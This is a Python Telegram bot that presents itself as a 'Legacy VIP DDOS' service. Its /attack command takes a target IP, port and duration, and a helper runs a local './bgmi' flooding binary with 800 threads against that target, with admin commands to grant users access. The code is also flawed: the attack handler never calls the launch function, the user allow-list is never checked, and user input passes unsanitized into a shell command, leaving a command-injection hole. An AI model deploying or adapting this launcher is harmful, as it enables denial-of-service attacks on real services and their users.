import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
ADMIN_USER_ID = 1342302666
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the Legacy VIP DDOS 🔥*\n\n"
        "*🚀 Use the following command to start an attack:*\n"
        "*📜 /attack <ip> <port> <duration>*\n\n"
        "*💡 Let’s Get Started! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def legacy(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /legacy <add|rem> <user_id>*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} has been added successfully!*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} has been removed successfully!*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    threads = 800  # Set your desired number of threads

    try:
        command = f"./bgmi {ip} {port} {duration} {threads}"
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our Legacy DDOS Bot!*", parse_mode='Markdown')

async def countdown_attack(chat_id, ip, port, duration, context):
    remaining_time = duration
    message = await context.bot.send_message(chat_id=chat_id, text=(
        "*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {remaining_time} seconds*\n"
        "*🔥 Enjoy and Have Fun! 💥*"
    ), parse_mode='Markdown')

    while remaining_time > 0:
        await asyncio.sleep(1)  # Wait for 1 second
        remaining_time -= 1

        await context.bot.edit_message_text(
            text=f"*⚔️ Attack Launched! ⚔️*\n"
                 f"*🎯 Target: {ip}:{port}*\n"
                 f"*🕒 Time Left: {remaining_time} seconds*\n"
                 "*🔥 Enjoy and Have Fun! 💥*",
            chat_id=chat_id,
            message_id=message.message_id,
            parse_mode='Markdown'
        )

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    if attack_in_progress:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ An attack is already in progress!*", parse_mode='Markdown')
        return

    if len(context.args) != 3:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip = context.args[0]
    port = context.args[1]
    duration = int(context.args[2])

    await countdown_attack(update.effective_chat.id, ip, port, duration, context)

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("legacy", legacy))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == '__main__':
    main()